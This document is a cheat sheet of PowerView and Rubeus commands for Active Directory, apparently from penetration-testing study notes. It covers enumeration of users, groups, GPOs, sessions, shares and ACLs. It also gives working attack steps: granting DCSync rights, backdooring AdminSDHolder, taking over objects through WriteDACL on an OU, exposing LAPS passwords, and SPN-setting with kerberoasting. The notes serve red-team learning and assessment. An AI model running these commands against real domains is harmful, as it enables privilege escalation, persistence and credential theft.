- Find computers with unconstrained delegation
	- `Get-DomainComputer -Unconstrained -Properties DnsHostName`
- Find computers and associated services for constrained delegation
	- `Get-DomainComputer -TrustedToAuth -Properties DnsHostName, MSDS-AllowedToDelegateTo`
- Get domain object for current domain or -Domain param
	- `Get-Domain`
- Enumerates DC for current or specified domain
	- `Get-DomainController | Select-Object Forest, Name, OSVersion`
- Returns all domains for the current forest or the forest specified by -Forest
	- `Get-ForestDomain`
- Get domain password policy
	- `Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess`
- Returns user objects, all by default
	- `Get-DomainUser`
	- `Get-DomainUser -Identity j.hunt -Properties DisplayName, MemberOf | Format-List`
- Return computer objects
	- `Get-DomainComputer`
	- `Get-DomainComputer -Properties DnsHostName | Sort-Object -Property DnsHostName`
- Search for Organizational Units in domain
	- `Get-DomainOU`
	- `Get-DomainOU -Properties Name | Sort-Object -Property Name`
- Return all groups or specific group objects in AD.
	- `Get-DomainGroup`
	- `Get-DomainGroup -Identity 'Domain Admins' | Select-Object -ExpandProperty Member`
- Return members of a specific domain group
	- `Get-DomainGroupMember`
	- `Get-DomainGroupMember -Identity 'Domain Admins' | Select-Object MemberDistinguishedName`
- Return Group Policy Objects (GPOs) or specific GPO objects in AD
	- `Get-DomainGPO`
	- `Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName`
	- `Get-DomainGPO -ComputerIdentity wkstn-1555 -Properties DisplayName | Sort-Object -Property DisplayName`
- Return all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences, plus user membership mappings
	- `Get-DomainGPOLocalGroup`
	- `Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName`
- Find all machines where members of a specific group are logged in
	- `Find-DomainUserLocation`
	- `Find-DomainUserLocation | Select-Object UserName, SessionFromName`
- Enumerate members of a specific local group on local or remote machine (local admin required)
	- `Get-NetLocalGroupMember`
	- `Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain`
- Return users logged in to local or remote machine (local admin required)
	- `Get-NetLoggedOn`
- Return session information for local or remote machine (CName is source IP)
	- `Get-NetSession`
	- `Get-NetSession -ComputerName fs-1 | Select-Object CName, UserName`
- Return all domain trusts for current or specified domain
	- `Get-DomainTrust`
- Display SIDs of principals that can create new GPOs, then translate
	- `Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl`
	- `ConvertFrom-SID S-1-5-21-3865823697-1816233505-1834004910-1605`
- Return SIDs of principals that can write to the GP-Link attribute on OUs
	- `Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl`
- Return list of computers in given OU
	- `Get-DomainComputer | ? { $_.DistinguishedName -match "OU=3268" -or $_.DistinguishedName -match "OU=5735" } | select DnsHostName`
- Return a list of all shares across the domain
	- `Find-DomainShare`
	- Filter for shares to which the current user has access
		- `Find-DomainShare -CheckAccess`
- Search for files across all shares on the domain
	- `Find-InterestingDomainShareFile -Include *training*`
- Get domain SID
	- `$(Get-ADDomain).DomainSID.Value`
- Get principal SID
	- `$(Get-ADUser Anakin).SID.Value`
- Return any principal that has GenericAll, WriteProperty, or WriteDacl on user "jadams"
	- `Get-DomainObjectAcl -Identity jadams | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select SecurityIdentifier, ActiveDirectoryRights | fl`
- Do the above but for an entire OU
	- `Get-DomainObjectAcl -SearchBase "CN=Users,DC=dev,DC=cyberbotic,DC=io" | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl`
- Grant user DCSync rights
	- `Add-DomainObjectAcl -TargetIdentity "DC=dev,DC=cyberbotic,DC=io" -PrincipalIdentity bfarmer -Rights DCSync`
- Modify AdminSDHolder DACL template to grant a user full rights
	- `Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,DC=dev,DC=cyberbotic,DC=io" -PrincipalIdentity bfarmer -Rights All`
- Return Kerberos policy for the domain
	- `Get-DomainPolicy | select -expand KerberosPolicy`
- Find principals native to another domain (outbound trust)
	- `Get-DomainForeignGroupMember -Domain cyberbotic.io`
- Find principals with ReadProperty on ms-Mcs-AdmPwd
	- `Get-DomainObjectAcl -SearchBase "LDAP://OU=Workstations,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -like "*ReadProperty*" } | select ObjectDN, SecurityIdentifier`
- Read ACEs applied to an object, automatically resolving the SID (Identity) for each.
	- `Get-ObjectAcl -Identity offsec -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}`
- Enumerate all ACEs for all domain users, resolve the SID, and filter on usernames that match our current user.
	- `Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}`
- Enumerate all domain groups to which our current user has explicit access rights
	- `Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | AddMember -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}`
- Add "GenericAll" access right to the TestService2 object for the principal "offsec"
	- `Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity offsec -Rights All`
- Enumerate Domain Trusts
	- `Get-DomainTrust`
	- Use DsEnumerateDomainTrusts API
		- `Get-DomainTrust -API`
- Exploit "WriteDACL" against an OU
	- With WriteDACL access on the OU object, you may grant yourself GenericAll against the OU, and then set another ACE on the OU that will inherit down to its descendent objects. First, you will need to set a GenericAll ACE against the OU object itself. This can be accomplished using the Add-DomainObjectAcl function in PowerView.
	- You may need to authenticate to the Domain Controller as a member of EVERYONE@GTS.INT if you are not running a process as a member if you are not running a process as a member of that group. To do this in conjunction with Add-DomainObjectACL, first create a PSCredential object (these examples comes from the PowerView help documentation)
		- `$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force`
		- `$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)`
	- Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as a member of (group that holds the ACE against the OU)
		- `Add-DomainObjectAcl -Credential $Cred -TargetIdentity (OU GUID) -Rights All`
	- With full control of the OU, you may now add a new ACE on the OU that will inherit down to the objects under that OU. Below are two options depending on how targeted you choose to be in this step
		- Generic Descendent Object Takeover
			- The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. Again, this can be done using PowerView. This time we will use the New-ADObjectAccessControlEntry, which gives us more control over the ACE we add to the OU.
				- Reference the OU by its ObjectGUID, not its name.
				- Will need the GUID for all objects. This should be 00000000-0000-0000-0000-000000000000
				- `$Guids = Get-DomainGUIDMap`
				- `$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name`
			- Construct the ACE. This command will create an ACE granting the "JKHOLER" user full control of all descendant objects.
				- `$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'JKOHLER' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid`
			- Apply the ACE to the target OU.
				- `$OU = Get-DomainOU -Raw (OU GUID)`
				- `$DsEntry = $OU.GetDirectoryEntry()`
				- `$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'`
				- `$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)`
				- `$dsEntry.PsBase.CommitChanges()`
		- Targetted Descendent Object Takeover
			- Example: grant the "ITADMIN" user the ability to read the LAPS password from all computer objects in the "Workstations" OU
		```PowerShell
		$Guids = Get-DomainGUIDMap
		$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name
		$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name
		$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid
		$OU = Get-DomainOU -Raw Workstations
		$DsEntry = $OU.GetDirectoryEntry()
		$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
		$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
		$dsEntry.PsBase.CommitChanges()
		```

- Set SPN on target account and kerberoast
	1. `Set-DomainObject -Identity kekw -Set @{serviceprincipalname="kekw/CTHULHU"}`
	2. `Rubeus.exe kerberoast /user:kekw /nowrap`